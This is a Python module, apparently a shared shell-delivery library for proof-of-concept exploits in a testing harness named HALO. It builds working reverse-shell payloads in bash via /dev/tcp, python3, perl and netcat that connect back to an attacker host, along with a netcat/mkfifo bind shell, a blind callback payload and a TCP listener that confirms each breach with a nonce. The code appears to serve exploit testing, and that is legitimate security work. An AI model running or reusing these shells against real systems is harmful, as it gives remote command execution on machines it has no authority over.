"""Generalized breach-delivery primitive for HALO curated PoCs.

Target-agnostic shell delivery + challenge-response (nonce) proof, shared by every
PoC under pocs/. Stdlib-socket only — runs unchanged in python:3.12-slim.

Trust model: the MODEL is untrusted, the PoC CODE is trusted (we wrote+tested it), the
TARGET is untrusted. A per-attempt nonce (minted by the orchestrator, injected as
HALO_NONCE) is echoed back by the target; only a matching echo proves *our* command ran
on *this* target — a tarpit streaming `uid=0(root)` cannot forge it.
"""
from __future__ import annotations

import os
import re
import socket
from dataclasses import dataclass

_EVIDENCE_PREFIX = "HALO-EVIDENCE"


def make_nonce() -> str:
    """A fresh unpredictable hex token. os.urandom so a target can't guess it."""
    return os.urandom(12).hex()


@dataclass(frozen=True)
class Breach:
    confirmed: bool
    level: str                 # "shell" | "blind-rce" | "none"
    nonce: str
    proof: str
    uid: str | None = None
    host: str | None = None
    exit_code: str | None = None

    def __bool__(self) -> bool:
        return self.confirmed

    def __str__(self) -> str:
        parts = [_EVIDENCE_PREFIX, f"nonce={self.nonce}", f"level={self.level}"]
        if self.uid is not None:
            parts.append(f"uid={self.uid}")
        if self.host is not None:
            parts.append(f"host={self.host}")
        if self.exit_code is not None:
            parts.append(f"exit={self.exit_code}")
        head = " ".join(parts)
        return f"{head}\n{self.proof}" if self.proof else head


def local_ip_for(target: str, _sock_factory=socket.socket) -> str:
    """deddy's source IP toward `target` — the LHOST for a reverse shell.

    Works because the ATTACK sandbox is --network=host, so getsockname() sees deddy's
    real interface (no packet is sent for a UDP connect())."""
    s = _sock_factory(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect((target, 9))
        return s.getsockname()[0]
    finally:
        s.close()


_UID_RE = re.compile(r"uid=(\d+)\(")


_SAFE_TOKEN_RE = re.compile(r"\A[0-9A-Za-z._-]+\Z")


def _require_safe(name: str, value: str) -> str:
    """Reject any token that could break out of the shell command it is embedded in.
    nonce/lhost are interpolated into sh -c payloads unquoted; a metacharacter here
    would be command injection on the target, so fail closed."""
    if not _SAFE_TOKEN_RE.match(str(value)):
        raise ValueError(f"unsafe {name} for payload: {value!r}")
    return str(value)


def _drain(sock: socket.socket, timeout: float) -> bytes:
    sock.settimeout(timeout)
    chunks = []
    try:
        while True:
            data = sock.recv(4096)
            if not data:
                break
            chunks.append(data)
    except OSError:
        pass
    return b"".join(chunks)


def confirm_shell(sock: socket.socket, *, service: str = "", nonce: str = "",
                  timeout: float = 8.0) -> Breach:
    """Probe an already-open shell socket with a challenge-response marker.

    Confirmed only when the target echoes `<nonce>-MARK` — proves *our* command ran,
    so a banner/tarpit that streams `uid=0` without the nonce is NOT a breach."""
    nonce = nonce or make_nonce()
    mark = f"{nonce}-MARK"
    try:
        sock.sendall(f"echo {mark}; id; uname -n\n".encode())
        out = _drain(sock, timeout)
    except OSError:
        out = b""
    finally:
        try:
            sock.close()
        except OSError:
            pass
    text = out.decode("utf-8", "replace")
    if mark not in text:
        return Breach(confirmed=False, level="none", nonce=nonce, proof=text)
    m = _UID_RE.search(text)
    uid = m.group(1) if m else None
    host = None
    for line in text.splitlines():
        line = line.strip()
        if line and line != mark and not line.startswith("uid=") and " " not in line:
            host = line
            break
    return Breach(confirmed=True, level="shell", nonce=nonce, proof=text.strip(),
                  uid=uid, host=host, exit_code="0")


def _first_available(*variants: str) -> str:
    """Chain shell variants so the first present interpreter wins."""
    guarded = []
    for bin_name, cmd in variants:
        guarded.append(f"command -v {bin_name} >/dev/null 2>&1 && {{ {cmd}; }}")
    return " || ".join(guarded)


def reverse_payload(lhost: str, lport: int, nonce: str) -> str:
    """Announce the nonce, then hand /bin/sh back over the reverse connection."""
    _require_safe("lhost", lhost)
    _require_safe("nonce", nonce)
    lport = int(lport)
    bash = (f"bash -c 'exec 3<>/dev/tcp/{lhost}/{lport}; echo {nonce}-MARK >&3; "
            f"sh -i >&3 2>&3 <&3'")
    py = (f"python3 -c 'import socket,subprocess,os;"
          f"s=socket.socket();s.connect((\"{lhost}\",{lport}));"
          f"s.sendall(b\"{nonce}-MARK\\n\");"
          f"[os.dup2(s.fileno(),f) for f in (0,1,2)];"
          f"subprocess.call([\"/bin/sh\",\"-i\"])'")
    perl = (f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};"
            f"socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
            f"connect(S,sockaddr_in($p,inet_aton($i)));"
            f"send(S,\"{nonce}-MARK\\n\",0);"
            f"open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'")
    nc = (f"(echo {nonce}-MARK; /bin/sh -i) 2>&1 | nc {lhost} {lport}")
    return _first_available(("bash", bash), ("python3", py), ("perl", perl), ("nc", nc))


def bind_payload(bind_port: int, nonce: str) -> str:
    """Spawn /bin/sh bound to bind_port; connect+confirm_shell proves it (nonce sent on probe)."""
    _require_safe("nonce", nonce)
    bind_port = int(bind_port)
    fifo = "/tmp/.hb"
    return (f"rm -f {fifo}; mkfifo {fifo}; "
            f"cat {fifo} | /bin/sh -i 2>&1 | nc -l -p {bind_port} > {fifo} &")


def blind_callback_payload(lhost: str, lport: int, nonce: str) -> str:
    """Connect back and send ONLY the nonce — proves code ran without a shell channel."""
    _require_safe("lhost", lhost)
    _require_safe("nonce", nonce)
    lport = int(lport)
    bash = f"bash -c 'exec 3<>/dev/tcp/{lhost}/{lport}; echo {nonce}-MARK >&3'"
    py = (f"python3 -c 'import socket;s=socket.socket();"
          f"s.connect((\"{lhost}\",{lport}));s.sendall(b\"{nonce}-MARK\")'")
    perl = (f"perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
            f"connect(S,sockaddr_in({lport},inet_aton(\"{lhost}\")));send(S,\"{nonce}-MARK\",0);'")
    nc = f"echo {nonce}-MARK | nc {lhost} {lport}"
    return _first_available(("bash", bash), ("python3", py), ("perl", perl), ("nc", nc))


class _Listener:
    """Ephemeral TCP listener bound on deddy (reachable via --network=host)."""

    def __init__(self, bind_ip: str = "0.0.0.0", timeout: float = 10.0):
        self._bind_ip = bind_ip
        self._timeout = timeout
        self._srv: socket.socket | None = None
        self.port = 0

    def __enter__(self) -> "_Listener":
        self._srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._srv.bind((self._bind_ip, 0))     # 0 → OS picks an ephemeral high port
        self._srv.listen(1)
        self._srv.settimeout(self._timeout)
        self.port = self._srv.getsockname()[1]
        return self

    def __exit__(self, *exc) -> None:
        if self._srv is not None:
            try:
                self._srv.close()
            finally:
                self._srv = None

    def accept_one(self) -> socket.socket | None:
        try:
            conn, _ = self._srv.accept()
            return conn
        except OSError:
            return None

    def wait_for_nonce(self, nonce: str) -> bool:
        conn = self.accept_one()
        if conn is None:
            return False
        try:
            data = _drain(conn, self._timeout)
        finally:
            conn.close()
        return f"{nonce}-MARK".encode() in data
